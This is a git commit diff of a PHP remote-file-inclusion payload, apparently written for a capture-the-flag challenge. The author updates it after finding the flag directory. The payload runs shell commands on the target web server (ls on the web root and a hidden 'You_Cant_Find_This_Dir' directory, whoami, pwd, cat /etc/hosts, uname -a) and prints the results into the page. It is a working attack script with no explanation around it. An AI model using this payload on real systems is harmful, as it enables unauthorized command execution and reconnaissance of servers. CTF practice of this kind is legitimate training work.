c34030100dd8650aaf8b033c8f88bdebf46cf38b
Febrian Sulistyo <121680589+fbrys@users.noreply.github.com>
2024-06-07 21:40:48 +0700

    Update test.php
    after gain directory of flag

--- test.php
+++ test.php
@@ -4,18 +4,21 @@
 <!-- Comment out the PHP code should the code not be executed server side.
 <?php
     $ls_output = `ls /var/www/html/rfi2`;
+    $ls_output_1 = `ls /var/www/html/rfi2/You_Cant_Find_This_Dir`;
     $whoami_output = `whoami`;
     $pwd_output = `pwd`;
     $catetchosts_output = `cat /etc/hosts`;
     $uname_a = `uname -a`;
     ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
-    ECHO "<div><ol><li>Root file directory listing (\"ls -alG /\")</li>";
+    ECHO "<div><ol><li>Root file directory listing (\"ls /var/www/html/rfi2 /\")</li>";
     ECHO "<li>Who Am I: (\"whoami\")</li>";
     ECHO "<li>Present Working Directory: (\"pwd\")</li>";
     ECHO "<li>Display contents of /etc/hosts: (\"cat /etc/hosts\")</li>";
     ECHO "<li>Print Out System Infomation: (\"uname -a\")</li>";
     ECHO "<b><dl><dt>\"ls\" command:</dt></b>";
     ECHO "<dd><pre>" .$ls_output ."</pre></dd>";
+    ECHO "<b><dl><dt>\"ls1\" command:</dt></b>";
+    ECHO "<dd><pre>" .$ls_output_1 ."</pre></dd>";
     ECHO "<dt><b>Who Am I?</b></dt>"; 
     ECHO "<dd>".$whoami_output. "</dd>";
     ECHO "<b><dt>Present Working Directory:</dt></b>";
